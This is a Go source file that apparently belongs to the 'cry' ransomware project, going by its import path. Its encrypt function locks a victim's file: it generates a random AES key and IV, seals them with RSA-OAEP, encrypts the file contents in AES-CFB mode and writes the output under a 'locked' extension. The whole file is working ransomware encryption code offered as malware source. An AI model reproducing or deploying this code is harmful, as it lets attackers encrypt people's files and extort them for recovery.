package main

import (
	"crypto/rsa"
	"fmt"
	"io/ioutil"

	"crypto/aes"
	"crypto/rand"

	"crypto/cipher"

	"crypto/sha256"

	"github.com/redpois0n/cry/common"
)

func encrypt(file string, priv *rsa.PrivateKey) {
	data, err := ioutil.ReadFile(file)

	if err != nil {
		panic(err)
	}

	key := make([]byte, common.KeySize)
	rand.Read(key)

	iv := make([]byte, aes.BlockSize)
	rand.Read(iv)

	header := append(key, iv...)
	pub := priv.PublicKey

	label := []byte("")
	header, err = rsa.EncryptOAEP(sha256.New(), rand.Reader, &pub, header, label)
	fmt.Println(header)

	if err != nil {
		panic(err)
	}

	block, err := aes.NewCipher(key)

	if err != nil {
		panic(err)
	}

	cipher := cipher.NewCFBEncrypter(block, iv)
	cipher.XORKeyStream(data, data)

	data = append(header, data...)

	ioutil.WriteFile(file+common.LockedExtension, data, 0777)
}
